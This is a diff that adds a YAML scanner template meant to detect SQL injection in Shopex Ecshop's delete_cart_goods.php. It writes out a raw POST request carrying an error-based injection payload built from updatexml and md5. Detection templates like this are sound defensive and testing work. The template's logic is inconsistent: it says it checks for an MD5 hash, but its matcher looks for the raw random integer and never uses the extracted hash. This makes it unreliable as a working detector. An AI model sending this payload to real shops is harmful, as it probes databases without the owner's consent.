@@ -1,0 +1,33 @@
+id: shopex-ecshop-sql-injection
+info:
+  name: Shopex Ecshop SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects a potential SQL injection vulnerability in Shopex Ecshop via the delete_cart_goods.php endpoint using a payload that checks for the MD5 hash of a random integer.
+http:
+  - raw:
+      - |
+        POST /delete_cart_goods.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        id=0||(updatexml(1,concat(0x7e,(select%20md5({{randomInt}})),0x7e),1))
+    extractors:
+      - type: regex
+        internal: true
+        name: hash
+        part: body
+        regex:
+          - "~([a-f0-9]{32})~"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{randomInt}}"
+variables:
+  randomInt: "{{rand_int(40000, 44800)}}"
